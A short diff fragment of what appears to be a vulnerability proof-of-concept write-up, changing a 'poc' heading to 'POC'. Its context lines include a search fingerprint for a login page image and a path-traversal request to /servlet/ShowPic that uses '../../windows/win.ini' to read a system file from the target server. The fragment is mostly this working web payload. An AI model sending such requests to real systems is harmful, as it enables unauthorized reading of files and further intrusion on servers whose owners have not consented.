@@ -8,7 +8,7 @@
 body="/images/logon/bg_img.jpg"
 ```
 
-## poc
+## POC
 
 ```js
 GET /servlet/ShowPic?filePath=../../windows/win.ini HTTP/1.1
